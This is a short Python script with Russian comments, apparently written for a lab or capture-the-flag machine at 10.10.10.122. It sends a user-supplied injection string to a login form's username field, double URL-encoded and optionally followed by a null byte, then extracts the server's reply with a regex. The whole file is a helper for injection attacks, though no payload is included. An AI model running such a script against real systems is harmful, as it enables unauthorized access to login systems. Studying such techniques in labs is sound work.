#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Использование: python3 inject.py <ИНЪЕКЦИЯ> <НУЛЕВОЙ_БАЙТ>

import sys
import re
from urllib.parse import quote_plus

import requests

# Куда стучимся
URL = 'http://10.10.10.122/login.php'

# Инъекция, закодированная в URL Encoding один раз (из первого аргумента скрипта)
inject = quote_plus(sys.argv[1])

# Нулевой байт, подаваемый по необходимости (из второго аргумента скрипта)
null_byte = sys.argv[2]

# Данные для POST-запроса (библиотека requests закодирует значения повторно => получится Double URL Encoding)
data = {
	'inputUsername': inject + null_byte,
	'inputOTP': '31337'
}

# Отправляем запрос
resp = requests.post(URL, data=data)

# Регулярками вытаскиваем ответ сервера
match = re.search(r'<div class="col-sm-10">(.*?)</div>', resp.text, re.DOTALL)

# И выводим его на экран
print(match.group(1).strip())
